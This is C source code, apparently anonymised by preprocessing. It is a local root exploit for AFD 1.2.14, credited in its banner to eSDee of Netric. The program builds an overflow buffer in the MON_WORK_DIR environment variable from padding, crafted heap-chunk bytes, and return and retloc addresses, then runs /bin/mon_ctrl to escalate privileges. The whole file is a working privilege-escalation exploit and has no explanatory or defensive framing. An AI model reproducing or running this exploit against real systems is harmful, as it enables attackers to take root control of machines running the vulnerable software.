
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int buffer ;


 int FUNC_0 (char*,char*,int *) ;
 int FUNC_1 (int ,char*,...) ;
 int FUNC_2 (char*,char*,int) ;
 int FUNC_3 (char*,int,int) ;
 int FUNC_4 (char*) ;
 char* VAR_0 ;
 int VAR_1 ;
 int FUNC_5 (char*) ;
 unsigned int FUNC_6 (char*,char**,int) ;

int
FUNC_7(int VAR_2, char *VAR_3[])
{
    char VAR_4[1135];

    unsigned int VAR_5 = 0xbfffe360;
    unsigned int VAR_6 = 0x0806f020;

    if (VAR_2 > 1) VAR_5 = FUNC_6(VAR_3[1], &VAR_3[1], 16);
    if (VAR_2 > 2) VAR_6 = FUNC_6(VAR_3[2], &VAR_3[2], 16);

    FUNC_3(VAR_4, 0x41, sizeof(VAR_4));
    FUNC_2(VAR_4, "MON_WORK_DIR=",13);
    FUNC_2(VAR_4+13, VAR_0, FUNC_5(VAR_0));

    VAR_4[1117] = 0xff;
    VAR_4[1118] = 0xff;
    VAR_4[1119] = 0xff;
    VAR_4[1120] = 0xff;

    VAR_4[1121] = 0xfc;
    VAR_4[1122] = 0xff;
    VAR_4[1123] = 0xff;
    VAR_4[1124] = 0xff;

    VAR_4[1126] = (VAR_5 & 0x000000ff);
    VAR_4[1127] = (VAR_5 & 0x0000ff00) >> 8;
    VAR_4[1128] = (VAR_5 & 0x00ff0000) >> 16;
    VAR_4[1129] = (VAR_5 & 0xff000000) >> 24;

    VAR_4[1130] = (VAR_6 & 0x000000ff);
    VAR_4[1131] = (VAR_6 & 0x0000ff00) >> 8;
    VAR_4[1132] = (VAR_6 & 0x00ff0000) >> 16;
    VAR_4[1133] = (VAR_6 & 0xff000000) >> 24;

    VAR_4[1134] = 0x0;
    FUNC_4(VAR_4);

    FUNC_1(VAR_1, "AFD 1.2.14 local root exploit by eSDee of Netric (www.netric.org)\n");
    FUNC_1(VAR_1, "-----------------------------------------------------------------\n");
    FUNC_1(VAR_1, "Ret    = 0x%08x\n", VAR_6);
    FUNC_1(VAR_1, "Retloc = 0x%08x\n", VAR_5);

    FUNC_0("/bin/mon_ctrl", "mon_ctrl", ((void*)0));
    return 0;
}
